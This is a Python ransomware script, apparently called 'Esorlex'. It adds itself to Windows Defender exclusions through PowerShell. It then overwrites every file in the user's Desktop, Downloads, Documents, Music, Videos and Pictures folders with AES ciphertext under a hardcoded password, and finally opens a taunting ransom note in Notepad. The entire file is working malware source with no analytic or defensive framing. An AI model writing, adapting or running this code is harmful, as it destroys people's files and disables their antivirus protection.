import os
import sys
import hashlib
import time
import subprocess
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from concurrent.futures import ThreadPoolExecutor, as_completed

def get_key(password: str):
    return hashlib.sha256(password.encode()).digest()

def encrypt_file(file_path: str, password: str):
    try:
        start_time = time.time()
        key = get_key(password)
        cipher = AES.new(key, AES.MODE_CBC)

        with open(file_path, 'rb') as f:
            plaintext = f.read()

        ciphertext = cipher.iv + cipher.encrypt(pad(plaintext, AES.block_size))

        with open(file_path, 'wb') as f:
            f.write(ciphertext)

        if time.time() - start_time > 10:
            return f"Timeout: {file_path}"

        return f"Encrypted: {file_path}"

    except Exception as e:
        return f"Error encrypting {file_path}: {str(e)}"

def find_files(directory: str):
    files_to_encrypt = []
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            if not file.endswith(".enc"):
                files_to_encrypt.append(file_path)
    return files_to_encrypt

def show_ransom_note():
    ransom_text = (
        "You're files have been encrypted 😢\n\n"
        "What a shame...."
    )
    ransom_file = os.path.join(os.environ["TEMP"], "Esorlex_Ransomware_Message.txt")

    try:
        with open(ransom_file, "w") as f:
            f.write(ransom_text)

        subprocess.Popen(["notepad.exe", ransom_file])
    except Exception as e:
        print(f"Failed to show ransom note: {e}")

def exclude():
    script_path = os.path.abspath(sys.argv[0])
    powershell_command = f'Add-MpPreference -ExclusionPath "{script_path}"'

    try:
        subprocess.run(["powershell", "-Command", powershell_command], check=True)
        print(f"Added Defender exclusion: {script_path}")
    except subprocess.CalledProcessError:
        print("Failed to add Defender exclusion (may require admin privileges).")

if __name__ == "__main__":
    exclude()

    directories_to_encrypt = [
        os.path.expanduser("~/Desktop"),
        os.path.expanduser("~/Downloads"),
        os.path.expanduser("~/Music"),
        os.path.expanduser("~/Documents"),
        os.path.expanduser("~/Videos"),
        os.path.expanduser("~/Pictures")
    ]

    password = "EsorlexOnTop"
    all_files = []

    for dir_path in directories_to_encrypt:
        if os.path.exists(dir_path):
            all_files.extend(find_files(dir_path))

    with ThreadPoolExecutor() as executor:
        futures = {executor.submit(encrypt_file, file, password): file for file in all_files}
        for future in as_completed(futures):
            print(future.result())

    show_ransom_note()
